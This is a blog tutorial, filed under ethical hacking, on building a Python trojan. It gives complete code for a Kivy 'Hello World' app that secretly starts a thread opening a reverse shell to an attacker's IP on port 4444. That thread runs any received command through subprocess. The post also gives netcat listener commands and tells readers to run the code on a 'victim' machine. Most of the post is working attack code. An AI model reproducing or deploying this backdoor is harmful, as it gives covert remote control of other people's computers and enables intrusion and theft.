---
layout: post
title: How to Make a Simple Trojan with Python
date: 2022-09-23 07:00:00 -500
categories: [Ethical Hacking,python]
tags: [python]
image:
  path: /assets/img/headers/How_To_Make_a_Simple_Trojan_with_Python.webp
---


***
<center><strong><font color="DarkGray">For the ones who didn’t know yet, a Trojan Horse Attack consists of embedding en exploit in an innocent-looking Application, or even in a document. As you might have guessed today we will embed a backdoor into a Kivy-made GUI. This attack is quite simple, the only thing you need to know is just some python and networking basics. Let us get started!</font></strong></center>


***
## **<strong><font color="Brown">Enumeration</font></strong>**
***

### **<strong><font color="DarkCyan">Requirements</font></strong>**
To get started, let's install the required libraries:
```bash
pip install kivy
pip install socket
pip install threaded
```
### **<strong><font color="DarkCyan">The Trojan</font></strong>**

How to build?

### **<strong><font color="DarkCyan">The Backdoor</font></strong>**

Among the many things we can embed in a Trojan Horse, I choose to embed a Backdoor.


* Basically, you can embed everything, but today we’ll embed a backdoor.

### **<strong><font color="DarkCyan">The App</font></strong>**

This is a key point, we will use the Kivy framework in order to develop an Innocent-looking app, but as the Trojan attack says, it will contain the malicious backdoor, which we’ll use to gain access to the computer. From then, you’ll own the target’s computer.


* Disclaimer : I am not a graphical apps experienced developer, just use them when I need. So the Trojan we’ll build has not a good graphics, however, you’ll be able to imporove it on your own with the Kivy’s documentation.

As said in the disclaimer, today we won’t focus on the graphic of the App, that can be easily improved just by going to Kivy’s Documentation, rather, we’ll focus on how to embed everything you want(here a Backdoor) in a graphical app.

### **<strong><font color="DarkCyan">The Hacker’s Machine</font></strong>**
we’ll just need to use Netcat and waitting for the response.open a Terminal Window and:
```bash
nc -lnv 4444
```
### **<strong><font color="DarkCyan">Start Coding</font></strong>**

Now it Is the moment to code our Trojan. Basically, we’ll organize using a function(a malicious one), and a class(the GUI). Such a simple code.

```python
from kivy.app import App
from kivy.uix.label import Label

import threading
import socket
import subprocess


def main():
    server_ip = 'your_local_ip'
    port = 4444
    
    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)


class App(App):
    def build(self):
        return Label(text="Hello World")



mal_thread = threading.Thread(target=main)
mal_thread.start()


app = App()
app.run()
```

* ```Lines 1/2```: Imported some Kivy basic modules.

* Lines 4/6: Imported the Socket and Subprocess module for the backdoor. Then the threading module in order to be able to execute both the malicious code and neutral(the GUI code).

* ```Lines 9/22```: Used the code of the Backdoor Attack in Python article to create a main function that contains the backdoor.

* ```Lines 26/27```: Build a ```“Hello World”``` simple GUI.

* ```Lines 31/32```: Created a thread for the ```main()``` function and then started it ```(mal_thread.start())```.

* ```Lines 35/36```: Ran the simple GUI.

### **<strong><font color="DarkCyan">On the Attacker Machine</font></strong>**

As shown previously, we will be using Netcat to bind a port and listen for incoming connections. In this case, we will use the well known 4444 port. This command will give you no output until the Victim connects.


```bash
nc -lvp 4444
```
### **<strong><font color="DarkCyan">On the Target Machine</font></strong>**

After having started the attack on the Attacker’s Machine, we can complete it on the victim machine.

Just export the code to the target machine and execute it, in order for the backdoor to work make sure you entered the right IP address at line 10.

Once you execute the code on the Victim computer, you’ll see a Kivy app saying “hello world” on the victim’s, and you’ll see this on the Attacker’s side:


![](/assets/img/posts/python_posts/1.png)

* So, we got a shell on the Victim computer using a Reverse Shell. Great!

